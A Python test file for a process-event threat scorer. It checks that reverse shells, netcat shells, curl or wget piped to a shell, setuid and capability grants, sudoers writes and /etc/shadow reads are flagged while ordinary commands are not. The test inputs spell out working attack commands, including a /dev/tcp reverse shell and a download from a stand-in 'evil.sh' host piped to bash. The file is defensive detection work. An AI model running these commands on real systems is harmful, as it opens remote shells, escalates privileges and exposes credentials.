from node_scoring import score_event, RuleScorer


def _ev(**kw):
    base = {"event_type": "execve", "comm": "", "exe": "", "args": []}
    base.update(kw)
    return base


def test_reverse_shell_is_critical():
    v = score_event(
        _ev(
            comm="bash",
            exe="/usr/bin/bash",
            args=["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
        )
    )
    assert v["is_threat"] is True
    assert v["severity"] == "critical"
    assert "/dev/tcp" in v["summary"]


def test_offensive_tool_flagged():
    v = score_event(_ev(comm="nc", exe="/usr/bin/nc", args=["nc", "-e", "/bin/sh"]))
    assert v["is_threat"] is True
    assert v["score"] >= 0.9


def test_exec_from_tmp_is_high():
    v = score_event(_ev(comm="x", exe="/tmp/x", args=["/tmp/x"]))
    assert v["is_threat"] is True
    assert v["severity"] == "high"


def test_benign_is_not_threat():
    v = score_event(_ev(comm="ls", exe="/usr/bin/ls", args=["ls", "-la"]))
    assert v["is_threat"] is False
    assert v["severity"] == "info"


def test_rulescorer_matches_function():
    ev = _ev(comm="nc", exe="/usr/bin/nc", args=["nc"])
    assert RuleScorer().score(ev) == score_event(ev)


# --- privilege escalation ----------------------------------------------------


def test_setuid_bit_added_is_high():
    v = score_event(
        _ev(comm="chmod", exe="/usr/bin/chmod", args=["chmod", "u+s", "/tmp/rootbash"])
    )
    assert v["is_threat"] is True
    assert v["severity"] == "high"
    assert "setuid" in v["summary"]


def test_setuid_numeric_mode_is_high():
    v = score_event(
        _ev(comm="chmod", exe="/usr/bin/chmod", args=["chmod", "4755", "/tmp/x"])
    )
    assert v["is_threat"] is True
    assert v["severity"] == "high"
    assert "setuid" in v["summary"]


def test_plain_chmod_mode_is_benign():
    v = score_event(
        _ev(comm="chmod", exe="/usr/bin/chmod", args=["chmod", "644", "/home/u/x.txt"])
    )
    assert v["is_threat"] is False


def test_capability_grant_via_setcap_is_high():
    v = score_event(
        _ev(
            comm="setcap",
            exe="/usr/sbin/setcap",
            args=["setcap", "cap_setuid+ep", "/tmp/x"],
        )
    )
    assert v["is_threat"] is True
    assert v["severity"] == "high"
    assert "capabilit" in v["summary"]


def test_sudoers_write_is_critical():
    v = score_event(
        _ev(
            comm="bash",
            exe="/usr/bin/bash",
            args=["bash", "-c", "echo 'evil ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"],
        )
    )
    assert v["is_threat"] is True
    assert v["severity"] == "critical"
    assert "sudoers" in v["summary"]


def test_known_privesc_binary_is_flagged():
    v = score_event(
        _ev(comm="pkexec", exe="/usr/bin/pkexec", args=["pkexec", "/bin/sh"])
    )
    assert v["is_threat"] is True
    assert "privilege-escalation" in v["summary"]


def test_shadow_file_read_is_high_credential_access():
    v = score_event(_ev(comm="cat", exe="/usr/bin/cat", args=["cat", "/etc/shadow"]))
    assert v["is_threat"] is True
    assert v["severity"] == "high"
    assert "credential" in v["summary"]


def test_add_to_privileged_group_is_high():
    v = score_event(
        _ev(
            comm="usermod",
            exe="/usr/sbin/usermod",
            args=["usermod", "-aG", "sudo", "evil"],
        )
    )
    assert v["is_threat"] is True
    assert v["severity"] == "high"
    assert "privileged group" in v["summary"]


def test_add_to_ordinary_group_is_benign():
    v = score_event(
        _ev(
            comm="usermod",
            exe="/usr/sbin/usermod",
            args=["usermod", "-aG", "audio", "alice"],
        )
    )
    assert v["is_threat"] is False


def test_plain_sudo_is_not_a_threat():
    v = score_event(
        _ev(comm="sudo", exe="/usr/bin/sudo", args=["sudo", "apt", "update"])
    )
    assert v["is_threat"] is False


# --- suspicious execution patterns -------------------------------------------


def test_curl_pipe_shell_is_critical():
    v = score_event(
        _ev(
            comm="bash",
            exe="/usr/bin/bash",
            args=["bash", "-c", "curl -s http://evil.sh | bash"],
        )
    )
    assert v["is_threat"] is True
    assert v["severity"] == "critical"
    assert "pipe" in v["summary"] or "download" in v["summary"]


def test_wget_pipe_shell_is_critical():
    v = score_event(
        _ev(comm="sh", exe="/bin/sh", args=["sh", "-c", "wget -qO- http://x/y.sh | sh"])
    )
    assert v["is_threat"] is True
    assert v["severity"] == "critical"


def test_base64_decode_pipe_shell_is_high():
    v = score_event(
        _ev(
            comm="bash",
            exe="/usr/bin/bash",
            args=["bash", "-c", "echo ZXZpbAo= | base64 -d | bash"],
        )
    )
    assert v["is_threat"] is True
    assert v["severity"] in ("high", "critical")
    assert "base64" in v["summary"]


def test_chmod_exec_in_world_writable_is_flagged():
    v = score_event(
        _ev(comm="chmod", exe="/usr/bin/chmod", args=["chmod", "+x", "/tmp/payload"])
    )
    assert v["is_threat"] is True
    assert "executable" in v["summary"]


def test_benign_curl_without_pipe_is_not_threat():
    v = score_event(
        _ev(comm="curl", exe="/usr/bin/curl", args=["curl", "-O", "http://x/file"])
    )
    assert v["is_threat"] is False


# --- numeric-mode and path-matching edge cases --------------------------------


def test_setuid_mode_with_sticky_bit_7755_is_flagged():
    # First octal digit 7 = setuid+setgid+sticky — every digit 2-7 carries
    # setuid and/or setgid and must be detected, not just 2/4/6.
    v = score_event(
        _ev(comm="chmod", exe="/usr/bin/chmod", args=["chmod", "7755", "/usr/bin/x"])
    )
    assert v["is_threat"] is True
    assert "setuid" in v["summary"]


def test_year_like_number_inside_path_is_not_setuid():
    # "2026" is part of a path token, not a standalone mode argument.
    v = score_event(
        _ev(
            comm="chmod",
            exe="/usr/bin/chmod",
            args=["chmod", "u+w", "/backup/2026/report"],
        )
    )
    assert v["is_threat"] is False


def test_chmod_600_in_tmp_is_not_an_exec_grant():
    # Mode 600 (octal) grants no execute bit; decimal parsing would misflag it.
    v = score_event(
        _ev(comm="chmod", exe="/usr/bin/chmod", args=["chmod", "600", "/tmp/secret"])
    )
    assert v["is_threat"] is False


def test_chmod_444_in_tmp_is_not_an_exec_grant():
    # Mode 444 (octal) is read-only for everyone.
    v = score_event(
        _ev(comm="chmod", exe="/usr/bin/chmod", args=["chmod", "444", "/tmp/notes"])
    )
    assert v["is_threat"] is False


def test_chmod_755_in_tmp_is_flagged_executable():
    # Guard pin: a real octal exec grant on a world-writable path stays flagged.
    v = score_event(
        _ev(comm="chmod", exe="/usr/bin/chmod", args=["chmod", "755", "/tmp/drop.sh"])
    )
    assert v["is_threat"] is True
    assert "executable" in v["summary"]


def test_path_merely_containing_tmp_substring_is_not_world_writable():
    # /home/user/tmpfile contains "/tmp" as a substring but is not under /tmp/.
    v = score_event(
        _ev(
            comm="chmod",
            exe="/usr/bin/chmod",
            args=["chmod", "+x", "/home/user/tmpfile"],
        )
    )
    assert v["is_threat"] is False
